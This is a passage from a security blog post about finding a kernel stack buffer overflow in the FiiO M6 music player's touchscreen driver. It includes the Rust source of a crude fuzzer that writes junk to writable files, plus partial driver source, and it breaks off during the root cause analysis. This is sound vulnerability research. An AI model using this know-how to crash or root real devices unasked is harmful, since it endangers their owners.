<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Rooting the FiiO M6 - Part 1 - Using the “World’s Worst Fuzzer” To Find A Kernel Bug" /><meta name="author" content="Jack Maginnes (stigward)" /><meta property="og:locale" content="en" /><meta name="description" content="Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the device to aid in my language learning studies and dabble in the world of “hi-fi” audio. With both those phases of my life well in the past, the device seemed to make a perfect vulnerability research target. Coincidentally, I had also just watched through all of gamozolabs’s Android exploitation livestream, so I was feeling even more inspired to target an Android-based device." /><meta property="og:description" content="Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the device to aid in my language learning studies and dabble in the world of “hi-fi” audio. With both those phases of my life well in the past, the device seemed to make a perfect vulnerability research target. Coincidentally, I had also just watched through all of gamozolabs’s Android exploitation livestream, so I was feeling even more inspired to target an Android-based device." /><link rel="canonical" href="https://stigward.github.io/posts/fiio-m6-kernel-bug/" /><meta property="og:url" content="https://stigward.github.io/posts/fiio-m6-kernel-bug/" /><meta property="og:site_name" content="Stigward’s Security Journal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-18T20:33:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Rooting the FiiO M6 - Part 1 - Using the “World’s Worst Fuzzer” To Find A Kernel Bug" /><meta name="twitter:site" content="@_stigward" /><meta name="twitter:creator" content="@_stigward" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jack Maginnes (stigward)","url":"https://github.com/stigward/"},"dateModified":"2023-03-28T10:52:17-06:00","datePublished":"2023-02-18T20:33:00-07:00","description":"Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the device to aid in my language learning studies and dabble in the world of “hi-fi” audio. With both those phases of my life well in the past, the device seemed to make a perfect vulnerability research target. Coincidentally, I had also just watched through all of gamozolabs’s Android exploitation livestream, so I was feeling even more inspired to target an Android-based device.","headline":"Rooting the FiiO M6 - Part 1 - Using the “World’s Worst Fuzzer” To Find A Kernel Bug","mainEntityOfPage":{"@type":"WebPage","@id":"https://stigward.github.io/posts/fiio-m6-kernel-bug/"},"url":"https://stigward.github.io/posts/fiio-m6-kernel-bug/"}</script><title>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug | Stigward's Security Journal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/new_favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/new_favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/new_favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/new_favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/new_favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stigward's Security Journal"><meta name="application-name" content="Stigward's Security Journal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/new_favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/profile.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stigward's Security Journal</a></div><div class="site-subtitle font-italic">Bug Creator and Exploiter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/stigward" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_stigward" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['stigward.research','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1676777580" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 18, 2023 </em> </span> <span> Updated <em class="" data-ts="1680022337" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 28, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/stigward/">Jack Maginnes (stigward)</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2094 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview:</h1><p>A few months ago, I was cleaning off my hardware workbench when I came across my <a href="https://www.fiio.com/m6">FiiO M6</a>, an Android-based “portable high-resolution lossless music player”. I originally purchased the device to aid in my language learning studies and dabble in the world of “hi-fi” audio. With both those phases of my life well in the past, the device seemed to make a perfect vulnerability research target. Coincidentally, I had also just watched through all of <a href="https://youtu.be/g62FXds2pt8">gamozolabs’s Android exploitation livestream</a>, so I was feeling even more inspired to target an Android-based device.</p><p><img data-src="https://www.samma3a.com/tech/en/wp-content/uploads/sites/2/2019/02/IMG_0022-2.jpg" alt="" data-proofer-ignore></p><p>Prior to this project, I had never looked for Android vulns and had no kernel VR/exploit dev experience. As such, quite a bit of reading, watching, and asking was involved to find even the trivial bug presented in this write-up. Should anyone more knowledgeable in these topics notice any inconsistencies or misunderstandings, please do not hesitate to reach out. While this post is primarily focused on the bug itself, I do plan to make a corresponding video to go more in-depth on the set-up, tools, and lessons learned. As someone who has never done this kind of work prior, I hope to get others started on the same path.</p><h1 id="tldr">TL;DR:</h1><p>The FiiO M6 has a kernel driver for its touchscreen. This driver creates an entry in the <code class="language-plaintext highlighter-rouge">/proc</code> filesystem named <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code> with global read and write permissions. The function assigned to handle write operations suffers from a straight forward stack-based buffer overflow, in which a user can overflow the 128-byte buffer, resulting in a crash.</p><h1 id="initial-recon">Initial Recon:</h1><h2 id="getting-a-shell"><span class="mr-2">Getting A Shell</span><a href="#getting-a-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The first thing I did was get USB debugging working. This was done by enabling the <a href="https://developer.android.com/studio/debug/dev-options">Developer Options</a> on the device and setting up <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> (adb) on my laptop. Once that was done, I was able to run <code class="language-plaintext highlighter-rouge">adb shell</code> and drop into a shell on the device.</p><p><img data-src="/assets/img/img_fiio/adb_shell.png" alt="adb_shell" data-proofer-ignore></p><p>As you can see in the above screenshot, the device was running a pretty old kernel version. This improved my hopes of being able to potentially find a vuln, even with my limited knowledge and skill set.</p><p>Next, I did a bit of manual searching, looking for anything interesting. However, because I am a total n00b with LPE bugs, nothing really jumped out to me immediately and I honestly wasn’t super sure where to be looking.</p><h2 id="source-code"><span class="mr-2">Source Code:</span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that I had a shell on the device and had done my basic recon, I figured the next logical step would be to get kernel source and look at device drivers and other potential attack vectors. While FiiO claims to release all their kernel source, it quickly became apparent this was only <em>kind of</em> true. There is a <a href="https://github.com/FiiOapp/FiiO_Kernel_Android_M6-M7-M9">repo</a> named “FiiO_Kernel_Android_M6-M7-M9.” However, it only has one commit with the comment <code class="language-plaintext highlighter-rouge">first init</code>. In addition, it has multiple open issues claiming that the source is both incomplete and will not build. I could also see information about drivers running on the device that simply were not in the repo, so I figured this avenue might not be as reliable as I had initially hoped.</p><h2 id="methodology"><span class="mr-2">Methodology:</span><a href="#methodology" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With no definitive kernel source, I was left with 2 options: reversing or fuzzing. Since I truly had no idea where to begin looking, I opted for the latter in hopes that it might steer my aimless journey through the Linux filesystem towards something that may be worth focusing on.</p><h1 id="very-dumb-fuzzing">(Very) Dumb Fuzzing:</h1><p>I remembered watching a gamazolabs stream where he was using what he deemed to be the “worlds worst Android fuzzer”. A quick Google search revealed to <a href="https://gamozolabs.github.io/fuzzing/2018/10/18/terrible_android_fuzzer.html">this</a> blog post, in which he details the process of creating the dumb fuzzer. It’s basic methodology is as follows:</p><ol><li>Take a supplied directory<li>Recursively iterate through the directory looking for files that we have read and/or write perms for<ol><li>If we have read permissions, try and read the file<li>If we have write permissions, try and write garbage to the file.</ol><li>Profit</ol><p>He then goes on to improve the fuzzer, but I decided the very dumb version was good enough for me, and modified the supplied source accordingly (full source provided below) to follow the exact methodology explained above.</p><p>Compiling and running it, the device crashed in &lt; 1 sec. I figured if it crashed that fast, there would certainly be a number of potential other crashes here to triage, so I made more adjustments to the script:</p><ol><li>Reduce the number of threads to 1 and have the 1 worker print what file it’s currently working on<li>Ignore files that we can read, and only focus on files with write permissions</ol><p>Thus the final form of my extremely dumb fuzzer looked as follows:</p><div class="language-rust highlighter-rouge"><div class="code-header"> <span data-label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
</pre><td class="rouge-code"><pre><span class="k">extern</span> <span class="k">crate</span> <span class="n">rand</span><span class="p">;</span>

<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">sync</span><span class="p">::{</span><span class="nb">Arc</span><span class="p">,</span> <span class="n">Mutex</span><span class="p">};</span>
<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::{</span><span class="n">Read</span><span class="p">,</span> <span class="n">Write</span><span class="p">};</span>
<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">path</span><span class="p">::{</span><span class="n">Path</span><span class="p">,</span> <span class="n">PathBuf</span><span class="p">};</span>

<span class="cd">/// Maximum number of threads to fuzz with</span>
<span class="k">const</span> <span class="n">MAX_THREADS</span><span class="p">:</span> <span class="nb">u32</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="k">fn</span> <span class="nf">listdirs</span><span class="p">(</span><span class="n">dir</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Path</span><span class="p">,</span> <span class="n">output_list</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="nb">Vec</span><span class="o">&lt;</span><span class="p">(</span><span class="n">PathBuf</span><span class="p">,</span> <span class="nb">bool</span><span class="p">)</span><span class="o">&gt;</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// List the directory</span>
    <span class="k">let</span> <span class="n">list</span> <span class="o">=</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="nf">read_dir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>

    <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">list</span><span class="p">)</span> <span class="o">=</span> <span class="n">list</span> <span class="p">{</span>
        <span class="c1">// Go through each entry in the directory, if we were able to list the</span>
        <span class="c1">// directory safely</span>
        <span class="k">for</span> <span class="n">entry</span> <span class="k">in</span> <span class="n">list</span> <span class="p">{</span>
            <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span> <span class="o">=</span> <span class="n">entry</span> <span class="p">{</span>
                <span class="c1">// Get the path representing the directory entry</span>
                <span class="k">let</span> <span class="n">path</span> <span class="o">=</span> <span class="n">entry</span><span class="nf">.path</span><span class="p">();</span>

                <span class="c1">// Get the metadata and discard errors</span>
                <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">metadata</span><span class="p">)</span> <span class="o">=</span> <span class="n">path</span><span class="nf">.symlink_metadata</span><span class="p">()</span> <span class="p">{</span>
                    <span class="c1">// Skip this file if it's a symlink</span>
                    <span class="k">if</span> <span class="n">metadata</span><span class="nf">.file_type</span><span class="p">()</span><span class="nf">.is_symlink</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">continue</span><span class="p">;</span>
                    <span class="p">}</span>

                    <span class="c1">// Recurse if this is a directory</span>
                    <span class="k">if</span> <span class="n">metadata</span><span class="nf">.file_type</span><span class="p">()</span><span class="nf">.is_dir</span><span class="p">()</span> <span class="p">{</span>
                        <span class="nf">listdirs</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">,</span> <span class="n">output_list</span><span class="p">);</span>
                    <span class="p">}</span>

                    <span class="c1">// Add this to the directory listing if it's a file</span>
                    <span class="k">if</span> <span class="n">metadata</span><span class="nf">.file_type</span><span class="p">()</span><span class="nf">.is_file</span><span class="p">()</span> <span class="p">{</span>
                        <span class="c1">//let can_read =</span>
                        <span class="c1">//    OpenOptions::new().read(true).open(&amp;path).is_ok();</span>
                       
                        <span class="k">let</span> <span class="n">can_write</span> <span class="o">=</span>
                            <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.write</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">)</span><span class="nf">.is_ok</span><span class="p">();</span>

                        <span class="c1">//output_list.push((path, can_read, can_write));</span>
                        <span class="n">output_list</span><span class="nf">.push</span><span class="p">((</span><span class="n">path</span><span class="p">,</span> <span class="n">can_write</span><span class="p">));</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cd">/// Fuzz thread worker</span>
<span class="k">fn</span> <span class="nf">worker</span><span class="p">(</span><span class="n">listing</span><span class="p">:</span> <span class="nb">Arc</span><span class="o">&lt;</span><span class="nb">Vec</span><span class="o">&lt;</span><span class="p">(</span><span class="n">PathBuf</span><span class="p">,</span> <span class="nb">bool</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Fuzz buffer</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">buf</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0x41u8</span><span class="p">;</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">];</span>

    <span class="c1">// Fuzz forever</span>
    <span class="nv">'next_case</span><span class="p">:</span> <span class="k">loop</span> <span class="p">{</span>
        <span class="k">let</span> <span class="n">rand_file</span> <span class="o">=</span> <span class="nn">rand</span><span class="p">::</span><span class="nn">random</span><span class="p">::</span><span class="o">&lt;</span><span class="nb">usize</span><span class="o">&gt;</span><span class="p">()</span> <span class="o">%</span> <span class="n">listing</span><span class="nf">.len</span><span class="p">();</span>
        <span class="k">let</span> <span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">can_write</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">listing</span><span class="p">[</span><span class="n">rand_file</span><span class="p">];</span>

        <span class="k">if</span> <span class="n">path</span><span class="nf">.starts_with</span><span class="p">(</span><span class="s">"/proc/"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">path</span><span class="nf">.to_str</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">()</span><span class="nf">.chars</span><span class="p">()</span><span class="nf">.nth</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">()</span><span class="nf">.is_digit</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="o">*</span><span class="n">can_write</span> <span class="p">{</span>
            <span class="c1">// Fuzz by writing</span>
            <span class="k">let</span> <span class="n">fd</span> <span class="o">=</span> <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.write</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
            <span class="nd">print!</span><span class="p">(</span><span class="s">"Writing {:?}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
            <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="k">mut</span> <span class="n">fd</span><span class="p">)</span> <span class="o">=</span> <span class="n">fd</span> <span class="p">{</span>
                <span class="k">let</span> <span class="n">fuzz_size</span> <span class="o">=</span> <span class="nn">rand</span><span class="p">::</span><span class="nn">random</span><span class="p">::</span><span class="o">&lt;</span><span class="nb">usize</span><span class="o">&gt;</span><span class="p">()</span> <span class="o">%</span> <span class="n">buf</span><span class="nf">.len</span><span class="p">();</span>
                <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="n">fd</span><span class="nf">.write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="o">..</span><span class="n">fuzz_size</span><span class="p">]);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="nd">print!</span><span class="p">(</span><span class="s">"Starting...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">let</span> <span class="k">mut</span> <span class="n">dirlisting</span> <span class="o">=</span> <span class="nn">Vec</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
    <span class="nf">listdirs</span><span class="p">(</span><span class="nn">Path</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"/"</span><span class="p">),</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">dirlisting</span><span class="p">);</span>

    <span class="nd">print!</span><span class="p">(</span><span class="s">"Created listing of {} files</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dirlisting</span><span class="nf">.len</span><span class="p">());</span>

    <span class="c1">// We wouldn't do anything without any files</span>
    <span class="nd">assert!</span><span class="p">(</span><span class="n">dirlisting</span><span class="nf">.len</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Directory listing was empty"</span><span class="p">);</span>

    <span class="c1">// Wrap it in an `Arc`</span>
    <span class="k">let</span> <span class="n">dirlisting</span> <span class="o">=</span> <span class="nn">Arc</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">dirlisting</span><span class="p">);</span>
    <span class="c1">// Spawn fuzz threads</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">threads</span> <span class="o">=</span> <span class="nn">Vec</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
    <span class="k">for</span> <span class="n">_</span> <span class="k">in</span> <span class="mi">0</span><span class="o">..</span><span class="n">MAX_THREADS</span> <span class="p">{</span>
        <span class="c1">// Create a unique arc reference for this thread and spawn the thread</span>
        <span class="k">let</span> <span class="n">dirlisting</span> <span class="o">=</span> <span class="n">dirlisting</span><span class="nf">.clone</span><span class="p">();</span>
        <span class="n">threads</span><span class="nf">.push</span><span class="p">(</span><span class="nn">std</span><span class="p">::</span><span class="nn">thread</span><span class="p">::</span><span class="nf">spawn</span><span class="p">(</span><span class="k">move</span> <span class="p">||</span> <span class="nf">worker</span><span class="p">(</span><span class="n">dirlisting</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="c1">// Wait for all threads to complete</span>
    <span class="k">for</span> <span class="n">thread</span> <span class="k">in</span> <span class="n">threads</span> <span class="p">{</span>
        <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="n">thread</span><span class="nf">.join</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span> 
</pre></table></code></div></div><h1 id="getting-a-crash-and-triaging">Getting a Crash and Triaging:</h1><p>After only about 15 seconds, the modified script with only 1 thread got a crash. The output of our fuzzer indicates the crash took place while writing to <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code>.</p><p><img data-src="/assets/img/img_fiio/ftxxxx_crash.png" alt="ftxxxx_crash" data-proofer-ignore> Once the device rebooted, the logs stored in <code class="language-plaintext highlighter-rouge">/sys/fs/pstore/console-ramoops</code> showed the following:</p><p><img data-src="/assets/img/img_fiio/kernel_panic.png" alt="kernel_panic" data-proofer-ignore> Nice! Based on the information displayed in the above two screenshots, I assumed that this was some sort of stack-based overflow in <code class="language-plaintext highlighter-rouge">/proc/ftxxxx-debug</code> ‘s write handler and the garbage data has smashed the stack and overwritten the saved return pointer, which is how the <code class="language-plaintext highlighter-rouge">0x41</code>s ended up in the PC register.</p><h1 id="root-cause-analysis">Root Cause Analysis:</h1><p>As mentioned, while I didn’t have source for this device, a quick google for <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code> turned up the <a href="https://github.com/kirananto/ZENFONE2/blob/master/drivers/input/touchscreen/ftxxxx_ex_fun.c">source for a touchscreen driver on the ZENFONE2</a>. While we can’t be certain that this is the same exact source running on the M6, it was actually good enough to perform an RCA on.</p><p>In <code class="language-plaintext highlighter-rouge">ZENFONE2/drivers/input/touchscreen/ftxxxx_ex_fun.c</code>, we see the following:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp">#define PROC_NAME "ftxxxx-debug"
</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">proc_operate_mode</span> <span class="o">=</span> <span class="n">PROC_UPGRADE</span><span class="p">;</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">proc_dir_entry</span> <span class="o">*</span><span class="n">ftxxxx_proc_entry</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">ftxxxx_debug_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">ftxxxx_debug_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">);</span>

<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">ftxxxx_proc_fops</span> <span class="o">=</span> <span class="p">{</span>
	<span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
	<span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">ftxxxx_debug_read</span><span class="p">,</span>
	<span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">ftxxxx_debug_write</span><span class="p">,</span>
<span class="p">};</span>

